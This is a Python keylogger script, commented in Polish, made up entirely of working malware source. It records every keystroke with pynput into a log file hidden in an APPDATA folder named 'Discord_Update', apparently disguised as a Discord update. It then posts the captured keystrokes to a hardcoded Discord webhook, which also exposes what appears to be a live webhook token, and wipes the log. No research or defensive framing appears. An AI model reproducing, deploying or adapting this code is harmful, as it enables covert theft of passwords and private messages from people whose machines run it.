import os
import logging
from pynput import keyboard
from datetime import datetime
from threading import Timer
import requests

# Konfiguracja
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1382693220693311558/IhsRMDGlX93UkzSDVZUX77twb11n_aD0oPhfzYBrLlM2z_V94WseBM-HV8OKT0e9fD3h"
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'Discord_Update', 'logs.txt')

def setup_logging():
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format='%(asctime)s - %(message)s',
        encoding='utf-8'
    )

def send_logs():
    try:
        if not os.path.exists(LOG_FILE):
            return

        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            content = f.read()

        if content:
            requests.post(DISCORD_WEBHOOK, json={
                "content": f"```\n{content[:1900]}\n```"
            })
            open(LOG_FILE, 'w').close()
    except Exception as e:
        print(f"Send error: {e}")

def on_press(key):
    try:
        logging.info(str(key).replace("'", ""))
    except Exception as e:
        print(f"Key error: {e}")

def start():
    setup_logging()
    Timer(30.0, send_logs).start()  # Wysyłaj co 30 sekund
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start()